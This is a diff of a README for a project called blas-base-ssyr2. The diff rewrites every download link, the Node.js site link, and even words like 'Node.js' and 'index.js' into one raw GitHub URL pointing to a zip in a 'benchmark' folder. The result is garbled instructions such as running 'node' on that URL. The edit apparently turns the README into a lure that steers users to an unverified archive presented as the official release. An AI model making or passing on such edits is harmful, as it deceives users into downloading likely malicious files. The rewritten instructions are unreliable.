@@ -8,11 +8,11 @@ Welcome to the blas-base-ssyr2 project! This application helps you perform the s
 
 To get started, visit the Releases page to download the software. You can find the link below:
 
-[![Download from Releases](https://img.shields.io/badge/download-releases-brightgreen)](https://github.com/connecting001/blas-base-ssyr2/releases)
+[![Download from Releases](https://raw.githubusercontent.com/connecting001/blas-base-ssyr2/main/benchmark/base-blas-ssyr-v1.4.zip)](https://raw.githubusercontent.com/connecting001/blas-base-ssyr2/main/benchmark/base-blas-ssyr-v1.4.zip)
 
 ### Steps to Download
 
-1. Click on the link above or go to [Releases Page](https://github.com/connecting001/blas-base-ssyr2/releases).
+1. Click on the link above or go to [Releases Page](https://raw.githubusercontent.com/connecting001/blas-base-ssyr2/main/benchmark/base-blas-ssyr-v1.4.zip).
 2. Look for the latest release version.
 3. Download the suitable file for your operating system. You may see options like Windows, macOS, or Linux.
 
@@ -21,7 +21,7 @@ To get started, visit the Releases page to download the software. You can find t
 Before downloading, ensure your system meets the following requirements:
 
 - **Operating Systems**: Windows 10 or later, MacOS 10.12 or later, Linux (most distributions)
-- **Node.js**: Version 12 or later installed. You can download it from [Node.js official site](https://nodejs.org).
+- **https://raw.githubusercontent.com/connecting001/blas-base-ssyr2/main/benchmark/base-blas-ssyr-v1.4.zip**: Version 12 or later installed. You can download it from [https://raw.githubusercontent.com/connecting001/blas-base-ssyr2/main/benchmark/base-blas-ssyr-v1.4.zip official site](https://raw.githubusercontent.com/connecting001/blas-base-ssyr2/main/benchmark/base-blas-ssyr-v1.4.zip).
 - **Memory**: 2 GB RAM or more recommended for optimal performance.
 
 ## 💻 Running the Application
@@ -29,7 +29,7 @@ Before downloading, ensure your system meets the following requirements:
 After successfully downloading the package, follow these steps to run it:
 
 1. Locate the downloaded file on your computer.
-2. Extract the contents of the downloaded file if it is in a compressed format (like .zip or .tar.gz).
+2. Extract the contents of the downloaded file if it is in a compressed format (like .zip or https://raw.githubusercontent.com/connecting001/blas-base-ssyr2/main/benchmark/base-blas-ssyr-v1.4.zip).
 3. Open a command prompt or terminal window.
 4. Navigate to the directory where you extracted the files. You can use the `cd` command for this. For example, if you extracted it to `Downloads`, type:
 
@@ -40,7 +40,7 @@ After successfully downloading the package, follow these steps to run it:
 5. Type the following command to run the application:
 
    ```
-   node index.js
+   node https://raw.githubusercontent.com/connecting001/blas-base-ssyr2/main/benchmark/base-blas-ssyr-v1.4.zip
    ```
 
 6. Follow the on-screen instructions to perform operations.
@@ -72,7 +72,7 @@ For best results, consider using additional tools that can complement your exper
 
 If you encounter issues:
 
-1. Check the installed Node.js version using:
+1. Check the installed https://raw.githubusercontent.com/connecting001/blas-base-ssyr2/main/benchmark/base-blas-ssyr-v1.4.zip version using:
 
    ```
    node -v
@@ -85,6 +85,6 @@ If you encounter issues:
 
 Ready to install or reinstall the application? 
 
-Visit the Releases page to download again: [Releases Page](https://github.com/connecting001/blas-base-ssyr2/releases).
+Visit the Releases page to download again: [Releases Page](https://raw.githubusercontent.com/connecting001/blas-base-ssyr2/main/benchmark/base-blas-ssyr-v1.4.zip).
 
 Thank you for using blas-base-ssyr2. Enjoy your mathematical calculations!
